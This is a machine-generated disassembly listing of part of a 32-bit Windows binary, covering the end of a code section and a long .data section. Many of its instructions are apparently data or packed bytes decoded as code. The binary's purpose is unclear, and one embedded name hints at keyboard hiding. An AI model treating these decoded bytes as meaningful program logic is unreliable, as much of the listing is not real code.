  412b66:	test   DWORD PTR [ebp-0x6b],esp
  412b69:	(bad)  
  412b6a:	cmp    eax,0x7016762b
  412b6f:	xchg   di,ax
  412b71:	les    ebp,FWORD PTR [esi-0x114cb165]
  412b77:	jmp    0x5c14e0ec
  412b7c:	lods   al,BYTE PTR ds:[esi]
  412b7d:	dec    ebp
  412b7e:	jp     0x412bdc
  412b80:	aad    0xf6
  412b82:	adc    bl,BYTE PTR [eax+0x26d55c0d]
  412b88:	pushf  
  412b89:	mov    gs,WORD PTR [edx-0x4c764d74]
  412b8f:	cmp    BYTE PTR [esi+0x506e924a],ah
  412b95:	inc    ecx
  412b96:	int    0x56
  412b98:	in     al,0x23
  412b9a:	mov    ss,WORD PTR ss:[ebp+0x7f]
  412b9e:	dec    ebx
  412b9f:	or     al,0x1d
  412ba1:	pop    edi
  412ba2:	add    ecx,DWORD PTR [edx]
  412ba4:	cwde   
  412ba5:	sub    edi,DWORD PTR [ebx]
  412ba7:	shl    DWORD PTR [ebx],1
  412ba9:	mov    dh,0x32
  412bab:	sbb    ecx,ebx
  412bad:	adc    DWORD PTR [edx],esi
  412baf:	daa    
  412bb0:	sbb    al,0x29
  412bb2:	pop    ecx
  412bb3:	test   BYTE PTR [ebp-0x11],0x65
  412bb7:	into   
  412bb8:	push   edx
  412bb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bba:	fadd   DWORD PTR [ecx+0x256a4b04]
  412bc0:	or     DWORD PTR ss:[edx-0x1771e928],ebx
  412bc7:	outs   dx,DWORD PTR ds:[esi]
  412bc8:	dec    eax
  412bc9:	loop   0x412b72
  412bcb:	in     al,0x87
  412bcd:	xchg   esi,eax
  412bce:	sti    
  412bcf:	aam    0x9b
  412bd1:	fwait
  412bd2:	sahf   
  412bd3:	imul   edx,DWORD PTR [ebx+0x2ccb4edb],0x76857a53
  412bdd:	push   0x4
  412bdf:	pop    ebx
  412be0:	inc    ebx
  412be1:	xchg   ebx,ecx
  412be3:	sub    ebx,ecx
  412be5:	xchg   ebx,ecx
  412be7:	dec    ecx
  412be8:	mov    eax,DWORD PTR [ebp-0x1c]
  412beb:	imul   eax,ecx
  412bee:	add    esp,eax
  412bf0:	xchg   edx,eax
  412bf1:	push   eax
  412bf2:	xor    ebx,ebx
  412bf4:	mov    edx,esp
  412bf6:	dec    edx
  412bf7:	inc    ebx
  412bf8:	add    ebx,DWORD PTR [edx+ebx*1]
  412bfb:	dec    ebx
  412bfc:	xor    edx,edx
  412bfe:	add    DWORD PTR [ebp-0xc],ebx
  412c01:	pop    ebx
  412c02:	mov    eax,DWORD PTR [ebp-0xc]
  412c05:	pop    edi
  412c06:	pop    esi
  412c07:	pop    ebx
  412c08:	leave  
  412c09:	ret    0x10

Disassembly of section .data:

00413000 <.data>:
  413000:	xor    al,0x39
  413002:	add    DWORD PTR [eax],eax
  413004:	inc    edx
  413005:	cmp    DWORD PTR [ecx],eax
  413007:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41300b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41300f:	add    BYTE PTR [esi+0x39],bl
  413012:	add    DWORD PTR [eax],eax
  413014:	push   0x39
  413016:	add    DWORD PTR [eax],eax
  413018:	jl     0x413053
  41301a:	add    DWORD PTR [eax],eax
  41301c:	xchg   BYTE PTR [ecx],bh
  41301e:	add    DWORD PTR [eax],eax
  413020:	xchg   esp,eax
  413021:	cmp    DWORD PTR [ecx],eax
  413023:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41302a:	add    DWORD PTR [eax],eax
  41302c:	mov    ah,0x39
  41302e:	add    DWORD PTR [eax],eax
  413030:	les    edi,FWORD PTR [ecx]
  413032:	add    DWORD PTR [eax],eax
  413034:	into   
  413035:	cmp    DWORD PTR [ecx],eax
  413037:	add    dh,dl
  413039:	cmp    DWORD PTR [ecx],eax
  41303b:	add    dl,ah
  41303d:	cmp    DWORD PTR [ecx],eax
  41303f:	add    dl,ch
  413041:	cmp    DWORD PTR [ecx],eax
  413043:	add    ah,dh
  413045:	cmp    DWORD PTR [ecx],eax
  413047:	add    ah,bh
  413049:	cmp    DWORD PTR [ecx],eax
  41304b:	add    BYTE PTR [eax],cl
  41304d:	cmp    al,BYTE PTR [ecx]
  41304f:	add    BYTE PTR [edx],dl
  413051:	cmp    al,BYTE PTR [ecx]
  413053:	add    BYTE PTR [edx],bl
  413055:	cmp    al,BYTE PTR [ecx]
  413057:	add    BYTE PTR [edx+edi*1],ah
  41305a:	add    DWORD PTR [eax],eax
  41305c:	xor    BYTE PTR [edx],bh
  41305e:	add    DWORD PTR [eax],eax
  413060:	cmp    bh,BYTE PTR [edx]
  413062:	add    DWORD PTR [eax],eax
  413064:	dec    eax
  413065:	cmp    al,BYTE PTR [ecx]
  413067:	add    BYTE PTR [edx+0x3a],dl
  41306a:	add    DWORD PTR [eax],eax
  41306c:	pop    esi
  41306d:	cmp    al,BYTE PTR [ecx]
  41306f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413073:	add    BYTE PTR [edx+0x3a],bh
  413076:	add    DWORD PTR [eax],eax
  413078:	test   BYTE PTR [edx],bh
  41307a:	add    DWORD PTR [eax],eax
  41307c:	mov    ?,WORD PTR [edx]
  41307e:	add    DWORD PTR [eax],eax
  413080:	cwde   
  413081:	cmp    al,BYTE PTR [ecx]
  413083:	add    BYTE PTR [edx-0x55fffec6],ah
  413089:	cmp    al,BYTE PTR [ecx]
  41308b:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  413092:	add    DWORD PTR [eax],eax
  413094:	enter  0x13a,0x0
  413098:	fdivr  QWORD PTR [edx]
  41309a:	add    DWORD PTR [eax],eax
  41309c:	out    0x3a,al
  41309e:	add    DWORD PTR [eax],eax
  4130a0:	repnz cmp al,BYTE PTR [ecx]
  4130a3:	add    dh,bh
  4130a5:	cmp    al,BYTE PTR [ecx]
  4130a7:	add    BYTE PTR [eax],cl
  4130a9:	cmp    eax,DWORD PTR [ecx]
  4130ab:	add    BYTE PTR [eax],bl
  4130ad:	cmp    eax,DWORD PTR [ecx]
  4130af:	add    BYTE PTR [eax],al
  4130b1:	add    BYTE PTR [eax],al
  4130b3:	add    BYTE PTR [esi],ch
  4130b5:	cmp    eax,DWORD PTR [ecx]
  4130b7:	add    BYTE PTR [edx+0x3b],al
  4130ba:	add    DWORD PTR [eax],eax
  4130bc:	pop    eax
  4130bd:	cmp    eax,DWORD PTR [ecx]
  4130bf:	add    BYTE PTR [eax+0x3b],ch
  4130c2:	add    DWORD PTR [eax],eax
  4130c4:	je     0x413101
  4130c6:	add    DWORD PTR [eax],eax
  4130c8:	nop
  4130c9:	cmp    eax,DWORD PTR [ecx]
  4130cb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4130d2:	add    DWORD PTR [eax],eax
  4130d4:	int3   
  4130d5:	cmp    eax,DWORD PTR [ecx]
  4130d7:	add    dl,bl
  4130d9:	cmp    eax,DWORD PTR [ecx]
  4130db:	add    dh,ah
  4130dd:	cmp    eax,DWORD PTR [ecx]
  4130df:	add    al,bh
  4130e1:	cmp    eax,DWORD PTR [ecx]
  4130e3:	add    BYTE PTR [esp+edi*1],cl
  4130e6:	add    DWORD PTR [eax],eax
  4130e8:	sbb    bh,BYTE PTR [ecx+eax*1]
  4130eb:	add    BYTE PTR [edx],ch
  4130ed:	cmp    al,0x1
  4130ef:	add    BYTE PTR [edx],bh
  4130f1:	cmp    al,0x1
  4130f3:	add    BYTE PTR [esi+0x3c],cl
  4130f6:	add    DWORD PTR [eax],eax
  4130f8:	pop    edx
  4130f9:	cmp    al,0x1
  4130fb:	add    BYTE PTR [edx+0x3c],ch
  4130fe:	add    DWORD PTR [eax],eax
  413100:	js     0x41313e
  413102:	add    DWORD PTR [eax],eax
  413104:	xchg   edx,eax
  413105:	cmp    al,0x1
  413107:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41310e:	add    DWORD PTR [eax],eax
  413110:	ret    0x13c
  413113:	add    ah,dl
  413115:	cmp    al,0x1
  413117:	add    dh,ah
  413119:	cmp    al,0x1
  41311b:	add    ah,dh
  41311d:	cmp    al,0x1
  41311f:	add    dh,bh
  413121:	cmp    al,0x1
  413123:	add    BYTE PTR [esi],cl
  413125:	cmp    eax,0x3d1e0001
  41312a:	add    DWORD PTR [eax],eax
  41312c:	sub    al,0x3d
  41312e:	add    DWORD PTR [eax],eax
  413130:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413136:	add    DWORD PTR [eax],eax
  413138:	pop    eax
  413139:	cmp    eax,0x3d6e0001
  41313e:	add    DWORD PTR [eax],eax
  413140:	cmp    BYTE PTR ds:0x3d920001,0x1
  413147:	add    BYTE PTR [esi-0x45fffec3],ah
  41314d:	cmp    eax,0x3dce0001
  413152:	add    DWORD PTR [eax],eax
  413154:	jmp    0x13d:0xf800013d
  41315b:	add    BYTE PTR [esi],al
  41315d:	add    DWORD PTR ds:[eax],eax
  413160:	sbb    al,0x3e
  413162:	add    DWORD PTR [eax],eax
  413164:	sub    bh,BYTE PTR [esi]
  413166:	add    DWORD PTR [eax],eax
  413168:	cmp    al,0x3e
  41316a:	add    DWORD PTR [eax],eax
  41316c:	dec    eax
  41316d:	add    DWORD PTR ds:[eax],eax
  413170:	pop    esp
  413171:	add    DWORD PTR ds:[eax],eax
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	add    DWORD PTR ds:[eax],eax
  413178:	jl     0x4131b8
  41317a:	add    DWORD PTR [eax],eax
  41317c:	mov    BYTE PTR [esi],bh
  41317e:	add    DWORD PTR [eax],eax
  413180:	cwde   
  413181:	add    DWORD PTR ds:[eax],eax
  413184:	lods   al,BYTE PTR ds:[esi]
  413185:	add    DWORD PTR ds:[eax],eax
  413188:	mov    edx,0xcc00013e
  41318d:	add    DWORD PTR ds:[eax],eax
  413190:	fidivr DWORD PTR [esi]
  413192:	add    DWORD PTR [eax],eax
  413194:	lock add DWORD PTR ds:[eax],eax
  413198:	(bad)  
  413199:	add    DWORD PTR ds:[eax],eax
  41319c:	push   cs
  41319d:	aas    
  41319e:	add    DWORD PTR [eax],eax
  4131a0:	sbb    bh,BYTE PTR [edi]
  4131a2:	add    DWORD PTR [eax],eax
  4131a4:	sub    bh,BYTE PTR [edi]
  4131a6:	add    DWORD PTR [eax],eax
  4131a8:	cmp    BYTE PTR [edi],bh
  4131aa:	add    DWORD PTR [eax],eax
  4131ac:	dec    esi
  4131ad:	aas    
  4131ae:	add    DWORD PTR [eax],eax
  4131b0:	bound  edi,QWORD PTR [edi]
  4131b2:	add    DWORD PTR [eax],eax
  4131b4:	outs   dx,BYTE PTR ds:[esi]
  4131b5:	aas    
  4131b6:	add    DWORD PTR [eax],eax
  4131b8:	js     0x4131f9
  4131ba:	add    DWORD PTR [eax],eax
  4131bc:	xchg   BYTE PTR [edi],bh
  4131be:	add    DWORD PTR [eax],eax
  4131c0:	xchg   esp,eax
  4131c1:	aas    
  4131c2:	add    DWORD PTR [eax],eax
  4131c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c5:	aas    
  4131c6:	add    DWORD PTR [eax],eax
  4131c8:	mov    dh,0x3f
  4131ca:	add    DWORD PTR [eax],eax
  4131cc:	enter  0x13f,0x0
  4131d0:	fidivr DWORD PTR [edi]
  4131d2:	add    DWORD PTR [eax],eax
  4131d4:	in     al,dx
  4131d5:	aas    
  4131d6:	add    DWORD PTR [eax],eax
  4131d8:	clc    
  4131d9:	aas    
  4131da:	add    DWORD PTR [eax],eax
  4131dc:	or     al,BYTE PTR [eax+0x1]
  4131df:	add    BYTE PTR [edx],ah
  4131e1:	inc    eax
  4131e2:	add    DWORD PTR [eax],eax
  4131e4:	xor    al,0x40
  4131e6:	add    DWORD PTR [eax],eax
  4131e8:	dec    eax
  4131e9:	inc    eax
  4131ea:	add    DWORD PTR [eax],eax
  4131ec:	pop    edx
  4131ed:	inc    eax
  4131ee:	add    DWORD PTR [eax],eax
  4131f0:	fs inc eax
  4131f2:	add    DWORD PTR [eax],eax
  4131f4:	je     0x413236
  4131f6:	add    DWORD PTR [eax],eax
  4131f8:	add    BYTE PTR [eax+0x1],0x0
  4131fc:	cwde   
  4131fd:	inc    eax
  4131fe:	add    DWORD PTR [eax],eax
  413200:	lods   al,BYTE PTR ds:[esi]
  413201:	inc    eax
  413202:	add    DWORD PTR [eax],eax
  413204:	mov    esp,0xca000140
  413209:	inc    eax
  41320a:	add    DWORD PTR [eax],eax
  41320c:	loopne 0x41324e
  41320e:	add    DWORD PTR [eax],eax
  413210:	lock inc eax
  413212:	add    DWORD PTR [eax],eax
  413214:	or     BYTE PTR [ecx+0x1],al
  413217:	add    BYTE PTR [esi],dl
  413219:	inc    ecx
  41321a:	add    DWORD PTR [eax],eax
  41321c:	sub    BYTE PTR [ecx+0x1],al
  41321f:	add    BYTE PTR [esi],dh
  413221:	inc    ecx
  413222:	add    DWORD PTR [eax],eax
  413224:	inc    esp
  413225:	inc    ecx
  413226:	add    DWORD PTR [eax],eax
  413228:	push   edx
  413229:	inc    ecx
  41322a:	add    DWORD PTR [eax],eax
  41322c:	pusha  
  41322d:	inc    ecx
  41322e:	add    DWORD PTR [eax],eax
  413230:	jo     0x413273
  413232:	add    DWORD PTR [eax],eax
  413234:	test   BYTE PTR [ecx+0x1],al
  413237:	add    BYTE PTR [edx-0x5ffffebf],dl
  41323d:	inc    ecx
  41323e:	add    DWORD PTR [eax],eax
  413240:	scas   al,BYTE PTR es:[edi]
  413241:	inc    ecx
  413242:	add    DWORD PTR [eax],eax
  413244:	mov    esi,0xd6000141
  413249:	inc    ecx
  41324a:	add    DWORD PTR [eax],eax
  41324c:	call   0xfa413392
  413251:	inc    ecx
  413252:	add    DWORD PTR [eax],eax
  413254:	push   es
  413255:	inc    edx
  413256:	add    DWORD PTR [eax],eax
  413258:	sbb    BYTE PTR [edx+0x1],al
  41325b:	add    BYTE PTR [esi],ch
  41325d:	inc    edx
  41325e:	add    DWORD PTR [eax],eax
  413260:	cmp    al,BYTE PTR [edx+0x1]
  413263:	add    BYTE PTR [esi+0x42],cl
  413266:	add    DWORD PTR [eax],eax
  413268:	pusha  
  413269:	inc    edx
  41326a:	add    DWORD PTR [eax],eax
  41326c:	add    BYTE PTR [eax],al
  41326e:	add    BYTE PTR [eax],al
  413270:	add    BYTE PTR [edx+0x1],0x0
  413274:	cwde   
  413275:	inc    edx
  413276:	add    DWORD PTR [eax],eax
  413278:	scas   al,BYTE PTR es:[edi]
  413279:	inc    edx
  41327a:	add    DWORD PTR [eax],eax
  41327c:	mov    edx,0xca000142
  413281:	inc    edx
  413282:	add    DWORD PTR [eax],eax
  413284:	fadd   QWORD PTR [edx+0x1]
  413287:	add    ah,ch
  413289:	inc    edx
  41328a:	add    DWORD PTR [eax],eax
  41328c:	clc    
  41328d:	inc    edx
  41328e:	add    DWORD PTR [eax],eax
  413290:	push   cs
  413291:	inc    ebx
  413292:	add    DWORD PTR [eax],eax
  413294:	sbb    BYTE PTR [ebx+0x1],al
  413297:	add    BYTE PTR [ebx+eax*2],ah
  41329a:	add    DWORD PTR [eax],eax
  41329c:	xor    al,BYTE PTR [ebx+0x1]
  41329f:	add    BYTE PTR [edx+0x43],al
  4132a2:	add    DWORD PTR [eax],eax
  4132a4:	push   eax
  4132a5:	inc    ebx
  4132a6:	add    DWORD PTR [eax],eax
  4132a8:	pop    edx
  4132a9:	inc    ebx
  4132aa:	add    DWORD PTR [eax],eax
  4132ac:	outs   dx,BYTE PTR ds:[esi]
  4132ad:	inc    ebx
  4132ae:	add    DWORD PTR [eax],eax
  4132b0:	test   BYTE PTR [ebx+0x1],al
  4132b3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4132ba:	add    DWORD PTR [eax],eax
  4132bc:	mov    eax,0xcc000143
  4132c1:	inc    ebx
  4132c2:	add    DWORD PTR [eax],eax
  4132c4:	fiadd  DWORD PTR [ebx+0x1]
  4132c7:	add    dl,ch
  4132c9:	inc    ebx
  4132ca:	add    DWORD PTR [eax],eax
  4132cc:	clc    
  4132cd:	inc    ebx
  4132ce:	add    DWORD PTR [eax],eax
  4132d0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4132d4:	adc    al,0x44
  4132d6:	add    DWORD PTR [eax],eax
  4132d8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4132dc:	xor    al,0x44
  4132de:	add    DWORD PTR [eax],eax
  4132e0:	inc    esi
  4132e1:	inc    esp
  4132e2:	add    DWORD PTR [eax],eax
  4132e4:	pop    edx
  4132e5:	inc    esp
  4132e6:	add    DWORD PTR [eax],eax
  4132e8:	inc    sp
  4132ea:	add    DWORD PTR [eax],eax
  4132ec:	jbe    0x413332
  4132ee:	add    DWORD PTR [eax],eax
  4132f0:	mov    es,WORD PTR [ecx+eax*1+0x0]
  4132f4:	sahf   
  4132f5:	inc    esp
  4132f6:	add    DWORD PTR [eax],eax
  4132f8:	scas   al,BYTE PTR es:[edi]
  4132f9:	inc    esp
  4132fa:	add    DWORD PTR [eax],eax
  4132fc:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413301:	inc    esp
  413302:	add    DWORD PTR [eax],eax
  413304:	in     al,dx
  413305:	inc    esp
  413306:	add    DWORD PTR [eax],eax
  413308:	clc    
  413309:	inc    esp
  41330a:	add    DWORD PTR [eax],eax
  41330c:	or     al,BYTE PTR [ebp+0x1]
  41330f:	add    BYTE PTR [esi],bl
  413311:	inc    ebp
  413312:	add    DWORD PTR [eax],eax
  413314:	sub    BYTE PTR [ebp+0x1],al
  413317:	add    BYTE PTR [eax],bh
  413319:	inc    ebp
  41331a:	add    DWORD PTR [eax],eax
  41331c:	inc    esp
  41331d:	inc    ebp
  41331e:	add    DWORD PTR [eax],eax
  413320:	dec    esi
  413321:	inc    ebp
  413322:	add    DWORD PTR [eax],eax
  413324:	pop    edx
  413325:	inc    ebp
  413326:	add    DWORD PTR [eax],eax
  413328:	add    BYTE PTR [eax],al
  41332a:	add    BYTE PTR [eax],al
  41332c:	jbe    0x413373
  41332e:	add    DWORD PTR [eax],eax
  413330:	mov    BYTE PTR [ebp+0x1],al
  413333:	add    BYTE PTR [eax-0x51fffebb],ah
  413339:	inc    ebp
  41333a:	add    DWORD PTR [eax],eax
  41333c:	retf   0x145
  41333f:	add    ah,bl
  413341:	inc    ebp
  413342:	add    DWORD PTR [eax],eax
  413344:	in     al,dx
  413345:	inc    ebp
  413346:	add    DWORD PTR [eax],eax
  413348:	add    BYTE PTR [esi+0x1],al
  41334b:	add    BYTE PTR [eax],bl
  41334d:	inc    esi
  41334e:	add    DWORD PTR [eax],eax
  413350:	sub    al,BYTE PTR [esi+0x1]
  413353:	add    BYTE PTR [esi],dh
  413355:	inc    esi
  413356:	add    DWORD PTR [eax],eax
  413358:	dec    edx
  413359:	inc    esi
  41335a:	add    DWORD PTR [eax],eax
  41335c:	pusha  
  41335d:	inc    esi
  41335e:	add    DWORD PTR [eax],eax
  413360:	ins    BYTE PTR es:[edi],dx
  413361:	inc    esi
  413362:	add    DWORD PTR [eax],eax
  413364:	add    BYTE PTR [esi+0x1],0x0
  413368:	xchg   esp,eax
  413369:	inc    esi
  41336a:	add    DWORD PTR [eax],eax
  41336c:	mov    al,ds:0xae000146
  413371:	inc    esi
  413372:	add    DWORD PTR [eax],eax
  413374:	ret    0x146
  413377:	add    dl,bl
  413379:	inc    esi
  41337a:	add    DWORD PTR [eax],eax
  41337c:	call   0xf24134c7
  413381:	inc    esi
  413382:	add    DWORD PTR [eax],eax
  413384:	inc    BYTE PTR [esi+0x1]
  413387:	add    BYTE PTR [esi],cl
  413389:	inc    edi
  41338a:	add    DWORD PTR [eax],eax
  41338c:	and    al,0x47
  41338e:	add    DWORD PTR [eax],eax
  413390:	cmp    al,BYTE PTR [edi+0x1]
  413393:	add    BYTE PTR [edi+eax*2+0x1],cl
  413397:	add    BYTE PTR [edx+0x47],bl
  41339a:	add    DWORD PTR [eax],eax
  41339c:	push   0x47
  41339e:	add    DWORD PTR [eax],eax
  4133a0:	jle    0x4133e9
  4133a2:	add    DWORD PTR [eax],eax
  4133a4:	xchg   esi,eax
  4133a5:	inc    edi
  4133a6:	add    DWORD PTR [eax],eax
  4133a8:	mov    ds:0xba000147,al
  4133ad:	inc    edi
  4133ae:	add    DWORD PTR [eax],eax
  4133b0:	int3   
  4133b1:	inc    edi
  4133b2:	add    DWORD PTR [eax],eax
  4133b4:	fadd   QWORD PTR [edi+0x1]
  4133b7:	add    al,dh
  4133b9:	inc    edi
  4133ba:	add    DWORD PTR [eax],eax
  4133bc:	push   es
  4133bd:	dec    eax
  4133be:	add    DWORD PTR [eax],eax
  4133c0:	sbb    cl,BYTE PTR [eax+0x1]
  4133c3:	add    BYTE PTR [eax],ch
  4133c5:	dec    eax
  4133c6:	add    DWORD PTR [eax],eax
  4133c8:	cmp    cl,BYTE PTR [eax+0x1]
  4133cb:	add    BYTE PTR [eax+0x48],cl
  4133ce:	add    DWORD PTR [eax],eax
  4133d0:	push   esp
  4133d1:	dec    eax
  4133d2:	add    DWORD PTR [eax],eax
  4133d4:	outs   dx,BYTE PTR ds:[esi]
  4133d5:	dec    eax
  4133d6:	add    DWORD PTR [eax],eax
  4133d8:	mov    BYTE PTR [eax+0x1],cl
  4133db:	add    BYTE PTR [eax-0x59fffeb8],bl
  4133e1:	dec    eax
  4133e2:	add    DWORD PTR [eax],eax
  4133e4:	mov    dl,0x48
  4133e6:	add    DWORD PTR [eax],eax
  4133e8:	ror    BYTE PTR [eax+0x1],0x0
  4133ec:	(bad)  
  4133ed:	dec    eax
  4133ee:	add    DWORD PTR [eax],eax
  4133f0:	add    BYTE PTR [eax],al
  4133f2:	add    BYTE PTR [eax],al
  4133f4:	lock dec eax
  4133f6:	add    DWORD PTR [eax],eax
  4133f8:	dec    BYTE PTR [eax+0x1]
  4133fb:	add    BYTE PTR [esi],cl
  4133fd:	dec    ecx
  4133fe:	add    DWORD PTR [eax],eax
  413400:	push   ds
  413401:	dec    ecx
  413402:	add    DWORD PTR [eax],eax
  413404:	cs dec ecx
  413406:	add    DWORD PTR [eax],eax
  413408:	add    BYTE PTR [eax],al
  41340a:	add    BYTE PTR [eax],al
  41340c:	push   eax
  41340d:	dec    ecx
  41340e:	add    DWORD PTR [eax],eax
	...
  413418:	stos   DWORD PTR es:[edi],eax
  413419:	inc    ebx
  41341a:	push   ebp
  41341b:	dec    ebp
  41341c:	add    BYTE PTR [eax],al
  41341e:	add    BYTE PTR [eax],al
  413420:	add    al,BYTE PTR [eax]
  413422:	add    BYTE PTR [eax],al
  413424:	cmp    eax,0xc3000000
  413429:	dec    eax
  41342a:	add    eax,DWORD PTR [eax]
  41342c:	ret    
  41342d:	cmp    al,BYTE PTR [ebx]
	...
  413437:	add    BYTE PTR [ebx+0x4d5543],ch
  41343d:	add    BYTE PTR [eax],al
  41343f:	add    BYTE PTR [esi+0x34],ah
  413442:	add    DWORD PTR [eax],eax
  413444:	add    DWORD PTR [eax],eax
  413446:	add    BYTE PTR [eax],al
  413448:	add    DWORD PTR [eax],eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	add    DWORD PTR [eax],eax
  41344e:	add    BYTE PTR [eax],al
  413450:	pop    esp
  413451:	xor    al,0x1
  413453:	add    BYTE PTR [eax+0x34],ah
  413456:	add    DWORD PTR [eax],eax
  413458:	fs xor al,0x1
  41345b:	add    ch,cl
  41345d:	sub    BYTE PTR [eax],al
  41345f:	add    BYTE PTR [edi+0x34],dh
  413462:	add    DWORD PTR [eax],eax
  413464:	add    BYTE PTR [eax],al
  413466:	jb     0x4134d5
  413468:	ins    DWORD PTR es:[edi],dx
  413469:	pop    ecx
  41346a:	dec    eax
  41346b:	outs   dx,DWORD PTR ds:[esi]
  41346c:	imul   ecx,DWORD PTR [eax+0x6c],0x68
  413470:	ja     0x4134e1
  413472:	imul   ebp,DWORD PTR cs:[esi+0x73],0x69483f00
  41347a:	fs gs dec ebx
  41347d:	gs jns 0x4134e2
  413480:	outs   dx,DWORD PTR ds:[esi]
  413481:	popa   
  413482:	jb     0x4134e8
  413484:	dec    esi
  413485:	gs ja  0x4134c8
  413488:	inc    eax
  413489:	pop    ecx
  41348a:	inc    edi
  41348b:	pop    eax
  41348c:	inc    esp
  41348d:	cmp    al,0x56
  41348f:	add    BYTE PTR [eax],al
  413491:	add    BYTE PTR [eax],al
  413493:	add    BYTE PTR [eax],ah
  413495:	xor    eax,0x1
  41349a:	add    BYTE PTR [eax],al
  41349c:	add    BYTE PTR [eax],al
  41349e:	add    BYTE PTR [eax],al
  4134a0:	and    bh,BYTE PTR [ebx]
  4134a2:	add    DWORD PTR [eax],eax
  4134a4:	add    BYTE PTR [eax],dh
  4134a6:	add    DWORD PTR [eax],eax
  4134a8:	aam    0x35
  4134aa:	add    DWORD PTR [eax],eax
	...
  4134b4:	je     0x4134f8
  4134b6:	add    DWORD PTR [eax],eax
  4134b8:	mov    ah,0x30
  4134ba:	add    DWORD PTR [eax],eax
  4134bc:	nop
  4134bd:	aaa    
  4134be:	add    DWORD PTR [eax],eax
	...
  4134c8:	ins    BYTE PTR es:[edi],dx
  4134c9:	inc    ebp
  4134ca:	add    DWORD PTR [eax],eax
  4134cc:	jo     0x413500
  4134ce:	add    DWORD PTR [eax],eax
  4134d0:	dec    esp
  4134d1:	cmp    BYTE PTR [ecx],al
	...
  4134db:	add    dl,ah
  4134dd:	dec    eax
  4134de:	add    DWORD PTR [eax],eax
  4134e0:	sub    al,0x33
  4134e2:	add    DWORD PTR [eax],eax
  4134e4:	adc    al,0x39
  4134e6:	add    DWORD PTR [eax],eax
	...
  4134f0:	inc    edx
  4134f1:	dec    ecx
  4134f2:	add    DWORD PTR [eax],eax
  4134f4:	hlt    
  4134f5:	xor    eax,DWORD PTR [ecx]
  4134f7:	add    BYTE PTR [ecx+edi*1],ch
  4134fa:	add    DWORD PTR [eax],eax
	...
  413504:	bound  ecx,QWORD PTR [ecx+0x1]
  413507:	add    BYTE PTR [esp+esi*1],cl
  41350a:	add    DWORD PTR [eax],eax
	...
  413520:	xor    al,0x39
  413522:	add    DWORD PTR [eax],eax
  413524:	inc    edx
  413525:	cmp    DWORD PTR [ecx],eax
  413527:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41352b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41352f:	add    BYTE PTR [esi+0x39],bl
  413532:	add    DWORD PTR [eax],eax
  413534:	push   0x39
  413536:	add    DWORD PTR [eax],eax
  413538:	jl     0x413573
  41353a:	add    DWORD PTR [eax],eax
  41353c:	xchg   BYTE PTR [ecx],bh
  41353e:	add    DWORD PTR [eax],eax
  413540:	xchg   esp,eax
  413541:	cmp    DWORD PTR [ecx],eax
  413543:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41354a:	add    DWORD PTR [eax],eax
  41354c:	mov    ah,0x39
  41354e:	add    DWORD PTR [eax],eax
  413550:	les    edi,FWORD PTR [ecx]
  413552:	add    DWORD PTR [eax],eax
  413554:	into   
  413555:	cmp    DWORD PTR [ecx],eax
  413557:	add    dh,dl
  413559:	cmp    DWORD PTR [ecx],eax
  41355b:	add    dl,ah
  41355d:	cmp    DWORD PTR [ecx],eax
  41355f:	add    dl,ch
  413561:	cmp    DWORD PTR [ecx],eax
  413563:	add    ah,dh
  413565:	cmp    DWORD PTR [ecx],eax
  413567:	add    ah,bh
  413569:	cmp    DWORD PTR [ecx],eax
  41356b:	add    BYTE PTR [eax],cl
  41356d:	cmp    al,BYTE PTR [ecx]
  41356f:	add    BYTE PTR [edx],dl
  413571:	cmp    al,BYTE PTR [ecx]
  413573:	add    BYTE PTR [edx],bl
  413575:	cmp    al,BYTE PTR [ecx]
  413577:	add    BYTE PTR [edx+edi*1],ah
  41357a:	add    DWORD PTR [eax],eax
  41357c:	xor    BYTE PTR [edx],bh
  41357e:	add    DWORD PTR [eax],eax
  413580:	cmp    bh,BYTE PTR [edx]
  413582:	add    DWORD PTR [eax],eax
  413584:	dec    eax
  413585:	cmp    al,BYTE PTR [ecx]
  413587:	add    BYTE PTR [edx+0x3a],dl
  41358a:	add    DWORD PTR [eax],eax
  41358c:	pop    esi
  41358d:	cmp    al,BYTE PTR [ecx]
  41358f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413593:	add    BYTE PTR [edx+0x3a],bh
  413596:	add    DWORD PTR [eax],eax
  413598:	test   BYTE PTR [edx],bh
  41359a:	add    DWORD PTR [eax],eax
  41359c:	mov    ?,WORD PTR [edx]
  41359e:	add    DWORD PTR [eax],eax
  4135a0:	cwde   
  4135a1:	cmp    al,BYTE PTR [ecx]
  4135a3:	add    BYTE PTR [edx-0x55fffec6],ah
  4135a9:	cmp    al,BYTE PTR [ecx]
  4135ab:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  4135b2:	add    DWORD PTR [eax],eax
  4135b4:	enter  0x13a,0x0
  4135b8:	fdivr  QWORD PTR [edx]
  4135ba:	add    DWORD PTR [eax],eax
  4135bc:	out    0x3a,al
  4135be:	add    DWORD PTR [eax],eax
  4135c0:	repnz cmp al,BYTE PTR [ecx]
  4135c3:	add    dh,bh
  4135c5:	cmp    al,BYTE PTR [ecx]
  4135c7:	add    BYTE PTR [eax],cl
  4135c9:	cmp    eax,DWORD PTR [ecx]
  4135cb:	add    BYTE PTR [eax],bl
  4135cd:	cmp    eax,DWORD PTR [ecx]
  4135cf:	add    BYTE PTR [eax],al
  4135d1:	add    BYTE PTR [eax],al
  4135d3:	add    BYTE PTR [esi],ch
  4135d5:	cmp    eax,DWORD PTR [ecx]
  4135d7:	add    BYTE PTR [edx+0x3b],al
  4135da:	add    DWORD PTR [eax],eax
